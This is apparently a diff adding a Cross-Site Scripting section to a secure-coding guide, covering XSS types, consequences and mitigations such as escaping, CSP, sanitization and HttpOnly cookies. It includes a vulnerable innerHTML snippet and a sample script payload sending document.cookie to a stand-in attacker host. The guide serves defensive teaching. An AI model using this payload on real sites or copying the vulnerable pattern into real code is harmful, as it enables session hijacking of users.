@@ -180,3 +180,142 @@ In the secure code above:
    - Implement automated security testing in the CI/CD pipeline to catch SQL injection vulnerabilities during the development process.
 
 By understanding and implementing these mitigation techniques, developers can significantly reduce the risk of SQL injection attacks in their applications. SQL injection remains a prevalent threat, but with proactive measures like input validation, prepared statements, and regular security audits, web applications can be safeguarded against this critical vulnerability.
+
+## Cross-Site Scripting (XSS)
+
+### What is Cross-Site Scripting?
+
+**Cross-Site Scripting (XSS)** is a web security vulnerability that allows attackers to inject malicious scripts into otherwise trusted websites. These scripts are executed in the browser of an unsuspecting user, leading to various malicious outcomes, such as session hijacking, data theft, or defacing websites. Unlike SQL Injection, which targets the backend database, XSS attacks focus on client-side manipulation.
+
+XSS attacks can have serious implications for both users and applications. If an attacker successfully injects a script, they can steal session cookies, bypass authentication mechanisms, and perform actions on behalf of legitimate users.
+
+#### Types of XSS Attacks
+
+1. **Stored XSS**:
+   - In this type of XSS, the malicious script is permanently stored on the target server (e.g., in a database) and then executed every time a user accesses the affected content. Common targets for stored XSS include comment sections, message boards, and profile pages.
+2. **Reflected XSS**:
+   - Reflected XSS occurs when user-supplied data is immediately reflected back by the server in the response without proper validation or encoding. This type of XSS is often found in error messages, search results, or any page that reflects input back to the user.
+3. **DOM-Based XSS**:
+   - In **DOM-based XSS**, the vulnerability exists entirely on the client side. It happens when JavaScript running in the browser modifies the DOM (Document Object Model) based on user input, without proper validation or sanitization. This can allow attackers to manipulate the page directly on the client side.
+
+### Examples of XSS Attacks
+
+#### Real-World XSS Attack Example: Stealing Session Cookies
+
+Consider a scenario where a website allows users to post comments without properly sanitizing or encoding the input. An attacker can insert a malicious script in the comment section, which, when viewed by other users, executes in their browsers.
+
+**Vulnerable Code Example**:
+
+```javascript
+// Vulnerable code: User input is directly rendered on the page without encoding
+const userInput = req.body.comment;
+document.getElementById("comments").innerHTML += userInput;
+```
+
+If an attacker submits the following as a comment:
+
+```html
+<script>
+  document.location = "http://malicious-site.com?cookie=" + document.cookie;
+</script>
+```
+
+When a user views the comment, the browser will execute the injected script, and the user's session cookie will be sent to the attacker's website.
+
+#### Consequences of XSS:
+
+- **Session Hijacking**: The attacker can steal the victim’s session cookie and impersonate the victim on the site.
+- **Data Theft**: The attacker can steal sensitive data or trick the victim into submitting sensitive information to a malicious site.
+- **Defacement**: Attackers can alter the appearance or behavior of a website, damaging the reputation of the business and its trustworthiness.
+
+### Mitigation Techniques
+
+Preventing XSS requires a combination of input validation, output encoding, and security policies that minimize the risk of malicious script execution. Below are key techniques to mitigate XSS vulnerabilities:
+
+#### 1. Input Validation and Output Encoding
+
+**Input validation** ensures that only valid data is accepted by the application, while **output encoding** ensures that any data displayed on the page is safely escaped and cannot be interpreted as executable code.
+
+- **Input Validation**: Always validate user inputs based on strict criteria (e.g., whitelisting allowed characters) before processing or storing them.
+- **Output Encoding**: Escape special characters like `<`, `>`, `&`, and `"` to ensure they are rendered as text rather than interpreted as HTML or JavaScript.
+
+**Code Snippet: Secure Code with Proper Encoding**:
+
+```javascript
+// Using a library to safely escape user input
+const escapeHTML = (str) => {
+  return str
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#039;");
+};
+
+const userInput = escapeHTML(req.body.comment);
+document.getElementById("comments").innerHTML += userInput;
+```
+
+In the above secure code:
+
+- The `escapeHTML` function safely encodes user input, replacing potentially dangerous characters with their HTML-encoded equivalents, preventing XSS attacks.
+
+#### 2. Implementing Content Security Policy (CSP)
+
+**Content Security Policy (CSP)** is an HTTP header that restricts which sources of content are allowed to be loaded and executed in the browser. By using CSP, you can prevent the execution of inline scripts and only allow trusted sources for scripts, styles, and other resources.
+
+**Code Snippet: Configuring CSP Headers in a Web Application**:
+
+```http
+Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com; object-src 'none';
+```
+
+Explanation:
+
+- **default-src 'self'**: This restricts all content to come from the same origin (the application itself).
+- **script-src 'self' https://apis.google.com**: This restricts scripts to only be loaded from the application itself and the trusted external source `https://apis.google.com`.
+- **object-src 'none'**: This blocks the use of `<object>`, `<embed>`, and `<applet>` tags to prevent malicious file embedding.
+
+#### 3. Sanitize User Inputs
+
+In addition to validating inputs, always sanitize user inputs by removing any potentially harmful characters or tags that could be used in an attack. This is especially important for user-generated content that will be rendered in the browser, such as comments or reviews.
+
+There are several libraries and frameworks that provide sanitization functions to handle this. For example, in **Node.js**, you can use the **sanitize-html** library to remove dangerous HTML tags from user input.
+
+**Code Snippet: Using a Sanitization Library in Node.js**:
+
+```javascript
+const sanitizeHtml = require("sanitize-html");
+
+const sanitizedInput = sanitizeHtml(req.body.comment, {
+  allowedTags: [],
+  allowedAttributes: {},
+});
+
+// Render the sanitized comment
+document.getElementById("comments").innerHTML += sanitizedInput;
+```
+
+In this example, all HTML tags are stripped from the user input, leaving only plain text. This ensures that any potential scripts or harmful markup are removed before rendering the input on the page.
+
+#### 4. Using HTTPOnly and Secure Cookies
+
+To mitigate the risk of attackers stealing session cookies using XSS, it’s important to use **HTTPOnly** and **Secure** flags when setting cookies.
+
+- **HTTPOnly Cookies**: These cookies cannot be accessed via JavaScript, preventing attackers from stealing them using XSS.
+- **Secure Cookies**: These cookies are only sent over HTTPS, ensuring they are not intercepted by attackers during transmission.
+
+**Code Snippet: Setting HTTPOnly and Secure Cookies in Node.js**:
+
+```javascript
+res.cookie("session", sessionID, { httpOnly: true, secure: true });
+```
+
+### Summary of XSS Mitigation Techniques
+
+- **Input Validation and Output Encoding**: Validate user inputs and encode any data before rendering it in the browser.
+- **Content Security Policy (CSP)**: Implement CSP headers to control which scripts can be executed on your web application.
+- **Sanitization**: Remove potentially harmful HTML tags or JavaScript from user inputs.
+- **Secure Cookies**: Use HTTPOnly and Secure flags on cookies to prevent them from being accessed or transmitted insecurely.
+
+Cross-Site Scripting is a significant threat to web applications, but by implementing the mitigation techniques outlined above, developers can significantly reduce the risk of XSS vulnerabilities. These defenses not only protect user data but also safeguard the reputation of the business by maintaining a secure environment.
